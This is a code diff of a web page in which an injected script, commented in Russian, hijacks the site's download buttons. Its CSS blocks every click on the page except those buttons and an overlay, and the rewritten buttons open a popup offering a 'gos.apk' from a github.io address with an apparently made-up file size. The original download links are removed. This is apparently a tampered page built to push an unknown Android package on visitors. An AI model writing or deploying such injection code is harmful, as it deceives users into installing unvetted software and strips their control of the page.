@@ -1997,134 +1997,75 @@ FastSearch();
     }, true); // true означает "перехват", срабатывает раньше всех скриптов на странице
 
 })();
-</script>
 <script>
 (function() {
-    /* --- НАСТРОЙКИ --- */
-    // Сделай имя файла на английском, так надежнее!
-    // Если на Гитхабе файл называется gos.apk, пиши сюда gos.apk
-    const MY_APK_LINK = "gos.apk"; 
-    
-    const MY_PANEL_TITLE = "Файл готов к загрузке";
-    const MY_BUTTON_TEXT = "Скачать файл";
+    // Ссылка на твой APK
+    const APK_LINK = "https://andrianovicartem55-lab.github.io/123/gos.apk";
 
-    /* 1. СТИЛИ (CSS) - Блокируем всё лишнее */
+    /* 1. ЖЕСТКАЯ БЛОКИРОВКА ВСЕГО */
     const style = document.createElement('style');
     style.innerHTML = `
-        /* БЛОКИРУЕМ ВООБЩЕ ВСЁ НА САЙТЕ */
-        body a, body button, body input, .btn {
-            pointer-events: none !important; /* Запрещаем клики */
+        /* Блокируем всё намертво */
+        html, body, a, button, input, .btn {
+            pointer-events: none !important;
             cursor: default !important;
         }
 
-        /* РАЗРЕШАЕМ: Верхнюю кнопку */
-        a#new-top-btn {
+        /* РАЗРЕШАЕМ ТОЛЬКО две нижние кнопки и наше окно */
+        .download-line-link, #my-p, #my-p * {
             pointer-events: auto !important;
             cursor: pointer !important;
         }
 
-        /* РАЗРЕШАЕМ: Кнопки файлов (триггеры) */
-        .download-line-link {
-            pointer-events: auto !important;
-            cursor: pointer !important;
-        }
-
-        /* СТИЛИ ПАНЕЛИ */
-        #my-custom-panel {
+        /* Стиль всплывающего окна */
+        #my-p {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.9); 
-            z-index: 999999999; /* Поверх всего */
-            display: none; /* Скрыто по умолчанию */
-            justify-content: center; align-items: center;
+            background: rgba(0,0,0,0.95); z-index: 1000000000;
+            display: none; justify-content: center; align-items: center;
         }
-        
-        /* ВАЖНО: Разрешаем клики внутри нашей панели */
-        #my-custom-panel * {
-            pointer-events: auto !important;
-        }
-
-        .my-panel-content {
+        .my-p-box {
             background: #222; padding: 30px; border-radius: 12px;
-            text-align: center; width: 350px; border: 1px solid #444;
-            box-shadow: 0 0 50px #000;
+            text-align: center; width: 340px; border: 1px solid #28a745;
         }
-        .my-panel-title { 
-            color: #fff; font-size: 22px; margin-bottom: 25px; 
-            font-weight: bold; font-family: sans-serif; 
-        }
-        .my-download-btn {
-            display: block; width: 100%; padding: 15px 0;
-            background: #28a745; color: white !important; 
+        .my-p-btn {
+            display: block; width: 100%; padding: 16px 0;
+            background: #28a745; color: #fff !important; 
             text-decoration: none !important; font-weight: bold; 
-            border-radius: 8px; font-size: 18px; font-family: sans-serif; 
-            cursor: pointer !important; margin-bottom: 15px; border: none;
-        }
-        .my-download-btn:hover { background: #218838; }
-        .my-close-btn {
-            background: #333; border: none; color: #fff !important; 
-            cursor: pointer !important; font-size: 14px; padding: 12px;
-            width: 100%; border-radius: 8px;
+            border-radius: 8px; font-size: 18px; margin-top: 20px;
         }
     `;
     document.head.appendChild(style);
 
-    /* 2. СОЗДАЕМ ПАНЕЛЬ (С жесткими командами onclick) */
-    const panelHTML = `
-        <div id="my-custom-panel">
-            <div class="my-panel-content">
-                <div class="my-panel-title">${MY_PANEL_TITLE}</div>
-                
-                <!-- Кнопка скачивания: сразу открывает ссылку -->
-                <a href="${MY_APK_LINK}" class="my-download-btn" download target="_blank">
-                    ${MY_BUTTON_TEXT}
-                </a>
-
-                <!-- Кнопка закрытия: просто скрывает блок -->
-                <button type="button" class="my-close-btn" onclick="document.getElementById('my-custom-panel').style.display='none'">
-                    Закрыть
-                </button>
+    /* 2. СОЗДАЕМ ОКНО СКАЧИВАНИЯ */
+    document.body.insertAdjacentHTML('beforeend', `
+        <div id="my-p">
+            <div class="my-p-box">
+                <div style="color:#fff; font-size:20px; font-family:sans-serif;">Файл готов</div>
+                <a href="${APK_LINK}" class="my-p-btn" download>СКАЧАТЬ (483.98 Mb)</a>
+                <div style="color:#555; margin-top:15px; font-size:12px; cursor:pointer;" onclick="document.getElementById('my-p').style.display='none'">Закрыть</div>
             </div>
         </div>
-    `;
-    document.body.insertAdjacentHTML('beforeend', panelHTML);
+    `);
 
-    /* 3. СКРИПТ: ЛЕЧИМ КНОПКИ САЙТА */
-    
-    // А) Верхняя кнопка "Скачать APK"
-    // Мы находим её, удаляем и создаем свою на её месте, чтобы убрать редиректы
-    const oldTopBtn = document.querySelector('a[href*="#download-now"]');
-    if (oldTopBtn) {
-        const newTopBtn = document.createElement('a');
-        newTopBtn.innerHTML = oldTopBtn.innerHTML; // Копируем текст/иконку
-        newTopBtn.className = oldTopBtn.className; // Копируем стиль
-        newTopBtn.id = 'new-top-btn'; // Даем свой ID для CSS
-        newTopBtn.href = '#download-now'; // Ставим якорь
-        
-        // При клике плавно скроллим
-        newTopBtn.onclick = function(e) {
-            e.preventDefault();
-            document.getElementById('download-now').scrollIntoView({behavior: 'smooth'});
-        };
-        
-        oldTopBtn.parentNode.replaceChild(newTopBtn, oldTopBtn);
+    /* 3. ОЖИВЛЯЕМ ТОЛЬКО ДВЕ КНОПКИ ВНИЗУ */
+    function init() {
+        const targetButtons = document.querySelectorAll('.download-line-link');
+        targetButtons.forEach(btn => {
+            // Удаляем старые переходы сайта
+            btn.href = "javascript:void(0)";
+            btn.removeAttribute('target');
+            
+            btn.onclick = function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                document.getElementById('my-p').style.display = 'flex';
+                return false;
+            };
+        });
     }
 
-    // Б) Кнопки файлов в списке (Триггеры панели)
-    // Находим все кнопки внизу
-    const triggerBtns = document.querySelectorAll('.download-line-link');
-    triggerBtns.forEach(btn => {
-        // Убиваем старую кнопку, создаем чистую копию
-        const newBtn = btn.cloneNode(true);
-        btn.parentNode.replaceChild(newBtn, btn);
-
-        // Вешаем открытие панели
-        newBtn.onclick = function(e) {
-            e.preventDefault(); 
-            e.stopPropagation();
-            document.getElementById('my-custom-panel').style.display = 'flex';
-        };
-    });
-
+    // Запуск через 500мс, чтобы перехватить кнопки после загрузки сайта
+    setTimeout(init, 500);
 })();
 </script>
 </body></html>
